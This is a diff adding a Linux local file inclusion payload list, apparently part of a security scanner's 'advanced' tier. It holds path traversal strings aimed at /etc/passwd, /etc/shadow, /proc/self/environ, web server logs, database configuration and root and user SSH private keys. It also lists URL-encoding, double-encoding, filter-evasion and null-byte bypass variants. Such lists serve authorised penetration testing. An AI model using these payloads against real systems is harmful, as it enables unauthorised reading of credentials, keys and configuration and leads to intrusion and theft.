@@ -1,0 +1,28 @@
+# LFI Linux — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+../../../../etc/passwd
+../../../../proc/self/environ
+# ── Advanced — sensitive files ─────────────────────────────────────────────
+../../../../proc/self/cmdline
+../../../../var/log/apache2/access.log
+../../../../etc/nginx/nginx.conf
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/issue
+../../../../proc/version
+../../../../proc/self/fd/0
+# ── Advanced — encoding bypasses ──────────────────────────────────────────
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+# ── Advanced — null byte ───────────────────────────────────────────────────
+../../../../etc/passwd%00
+../../../../etc/passwd%00.php
+# ── Advanced — app-specific paths ─────────────────────────────────────────
+../../../../var/www/html/config.php
+../../../../usr/local/etc/nginx/nginx.conf
+../../../../home/ubuntu/.ssh/id_rsa
+../../../../root/.ssh/id_rsa
+../../../../etc/mysql/my.cnf
